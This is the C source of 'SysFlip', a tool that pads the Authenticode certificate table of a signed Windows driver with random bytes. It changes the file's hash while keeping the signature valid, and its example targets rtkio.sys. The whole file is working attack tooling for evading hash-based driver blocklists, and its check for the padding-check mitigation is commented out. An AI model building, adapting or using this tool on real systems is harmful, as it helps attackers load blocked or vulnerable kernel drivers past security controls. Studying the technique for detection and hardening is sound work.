#include <windows.h>
#include <stdio.h>
#include <wintrust.h>
#include <helper.h>

#define MAX_PATH_LENGTH 260

void printHelp(const wchar_t* programName) {
    fwprintf(stderr, L"SysFlip\n");
    fwprintf(stderr, L"\nArguments:\n\n");
    fwprintf(stderr, L"    <input_file>    Path to the signed driver file (e.g., driver.sys)\n");
    fwprintf(stderr, L"    <output_file>   Path to save the modified PE file\n\n");
    fwprintf(stderr, L"Example:\n\n");
    fwprintf(stderr, L"    %ls rtkio.sys rtkio_modified.sys\n", programName);
}


BOOL checkConfig() {
    HKEY hKey;
    LONG hResult;
    BOOL check = FALSE;

    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"Software\\Wow6432Node\\Microsoft\\Cryptography\\Wintrust\\Config", 0, KEY_READ, &hKey) == ERROR_SUCCESS || 
        RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Cryptography\\Wintrust\\Config", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            
        DWORD dwType;
        hResult = RegQueryValueExW(hKey, L"EnableCertPaddingCheck", NULL, &dwType, NULL, NULL);
        if (hResult == ERROR_SUCCESS) {
            check = TRUE;
        }
        RegCloseKey(hKey);
    }
    return check;
}

int wmain(int argc, wchar_t* argv[]) {
    if (argc != 3) {
        printHelp(argv[0]);
        return 1;
    }

    wchar_t fPath[MAX_PATH_LENGTH] = {0};
    wchar_t oPath[MAX_PATH_LENGTH] = {0};

    HANDLE fHandle = INVALID_HANDLE_VALUE;
    HANDLE oHandle = INVALID_HANDLE_VALUE;

    LPWSTR fwPath = NULL;
    LPWSTR owPath = NULL;

    DWORD fSize = 0;
    wchar_t* rPadding = NULL;
    void* peBlob = NULL;
    DWORD bytesRead = 0;

    PIMAGE_DOS_HEADER dosHeader = NULL;
    PIMAGE_NT_HEADERS ntHeader = NULL;
    IMAGE_OPTIONAL_HEADER optHeader = {0};
    DWORD dtSecEntryOffset = 0;
    wchar_t* sha1HashStr = NULL;

    DWORD certTableRVA = 0;
    SIZE_T certTableSize = 0;
    LPWIN_CERTIFICATE wCert = NULL;
    DWORD checksum = 0;

    FILE* oFile = NULL;
    SIZE_T writteBytes = 0;

    wcsncpy_s(fPath, MAX_PATH_LENGTH, argv[1], _TRUNCATE);
    wcsncpy_s(oPath, MAX_PATH_LENGTH, argv[2], _TRUNCATE);

    wprintf(L"[+] Input file: %ls\n", fPath);
    wprintf(L"[+] Output file: %ls\n", oPath);

    // if (checkConfig()) {
    //     fprintf(stderr, "[!] Endpoint has EnableCertPaddingCheck enabled - this may not work!\n\n");
    //     exit(EXIT_FAILURE);
    // }

    fHandle = CreateFileW(fPath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (fHandle == INVALID_HANDLE_VALUE) {
        fwprintf(stderr, L"[!] Could not open file: %ls\n", fPath);
        exit(EXIT_FAILURE);
    }

    if (vertifyPESig(fPath, fHandle) == 0) {
        wprintf(L"[+] PE File '%ls' is SIGNED\n", fPath);
    } else {
        wprintf(L"[-] PE File '%ls' is NOT SIGNED\n", fPath);
    }

    fSize = GetFileSize(fHandle, NULL);
    rPadding = genRandomBytes(8);

    peBlob = malloc(fSize + (wcslen(rPadding) * sizeof(wchar_t)));
    if (!peBlob) {
        fwprintf(stderr, L"[!] Memory allocation failed\n");
        goto cleanup;
    }

    if (!ReadFile(fHandle, peBlob, fSize, &bytesRead, NULL) || bytesRead == 0) {
        fwprintf(stderr, L"[!] Failed to read file: %ls\n", fPath);
        goto cleanup;
    }

    dosHeader = (PIMAGE_DOS_HEADER)peBlob;

    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        fwprintf(stderr, L"[!] %ls is not a valid PE file (MZ header not found)\n", fPath);
        goto cleanup;
    }

    sha1HashStr = (wchar_t*)malloc((SHA1LEN * 2 + 1) * sizeof(wchar_t));
    if (sha1HashStr) {
        if (sha1hash((BYTE*)peBlob, sha1HashStr, GetFileSize(fHandle, NULL))) {
            wprintf(L"[+] Original SHA1: %ls\n", sha1HashStr);
        } else {
            wprintf(L"[!] Failed to compute original SHA1 hash\n");
            free(sha1HashStr);
            sha1HashStr = NULL;
        }
    } 

    ntHeader = (PIMAGE_NT_HEADERS)((BYTE*)peBlob + dosHeader->e_lfanew);
    optHeader = ntHeader->OptionalHeader;

    if (is_wow64(GetCurrentProcess())) {
        if (optHeader.Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
            dtSecEntryOffset = 2;
        }
    } else {
        if (optHeader.Magic == IMAGE_NT_OPTIONAL_HDR32_MAGIC) {
            dtSecEntryOffset = (DWORD)-2;
        }
    }

    certTableRVA = optHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY + dtSecEntryOffset].VirtualAddress;
    certTableSize = optHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY + dtSecEntryOffset].Size;
    wCert = (LPWIN_CERTIFICATE)((BYTE*)peBlob + certTableRVA);

    wprintf(L"[+] Bit flipping PE file '%ls'...\n", fPath);

    if (rPadding) {
        wprintf(L"[+] Padding '%ls' with %ls of size %d\n", fPath, rPadding, (int)wcslen(rPadding));
        memcpy((((BYTE*)peBlob + certTableRVA) + wCert->dwLength), rPadding, wcslen(rPadding) * sizeof(wchar_t));

        wprintf(L"[+] Updating OPT Header Fields/Entries...\n");
        wCert->dwLength += (wcslen(rPadding) * sizeof(wchar_t));
        ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY + dtSecEntryOffset].Size += (wcslen(rPadding) * sizeof(wchar_t));

        wprintf(L"[+] Calculating the new OPTHeader checksum\n");
        checksum = peCheckSum(peBlob, fSize + (DWORD)(wcslen(rPadding) * sizeof(wchar_t)));
        ntHeader->OptionalHeader.CheckSum = checksum;

        sha1HashStr = (wchar_t*)malloc(((SHA1LEN * 2) + 1) * sizeof(wchar_t));
        if (sha1HashStr) {
            if (sha1hash((BYTE*)peBlob, sha1HashStr, fSize + (DWORD)(wcslen(rPadding) * sizeof(wchar_t)))) {
                wprintf(L"[+] Modified SHA1: %ls\n", sha1HashStr);
            } else {
                wprintf(L"[!] Failed to compute modified SHA1 hash\n");
                free(sha1HashStr);
                sha1HashStr = NULL;
            }
        }

        wprintf(L"[+] Saving Bit-flipped PE file to: %ls\n", oPath);
        _wfopen_s(&oFile, oPath, L"wb");
        if (oFile) {
            writteBytes = fwrite(peBlob, (fSize + (wcslen(rPadding) * sizeof(wchar_t))), 1, oFile);
            fclose(oFile);
        }
    }

    oHandle = CreateFileW(oPath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (oHandle != INVALID_HANDLE_VALUE) {
        if (vertifyPESig(oPath, oHandle) == 0) {
            wprintf(L"[+] Modified PE File '%ls' is SIGNED\n", oPath);
        } else {
            wprintf(L"[-] Modified PE File '%ls' is NOT SIGNED\n", oPath);
        }
        CloseHandle(oHandle);
    }

cleanup:
    if (peBlob) free(peBlob);
    if (rPadding) free(rPadding);
    if (sha1HashStr) free(sha1HashStr);
    if (fHandle != INVALID_HANDLE_VALUE) CloseHandle(fHandle);
    if (oHandle != INVALID_HANDLE_VALUE) CloseHandle(oHandle);

    return 0;
}